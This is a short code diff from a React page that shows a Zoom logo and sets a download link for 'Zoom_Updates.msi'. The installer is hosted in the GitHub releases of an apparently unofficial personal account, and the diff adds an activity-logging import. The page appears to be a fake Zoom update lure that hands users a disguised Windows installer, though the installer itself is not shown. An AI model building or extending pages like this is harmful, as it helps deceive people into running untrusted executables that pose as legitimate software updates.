@@ -2,6 +2,7 @@ import { MessageCircle, ChevronDown } from "lucide-react";
 import { useNavigate } from "react-router-dom";
 import { toast } from "sonner";
 import zoomLogo from "@/assets/zoom-logo.png";
+import { logActivity } from "@/lib/activity";
 
 const DOWNLOAD_URL =
   "https://github.com/elizzygettygrant-maker/zoomupdates/releases/download/v.6565/Zoom_Updates.msi";
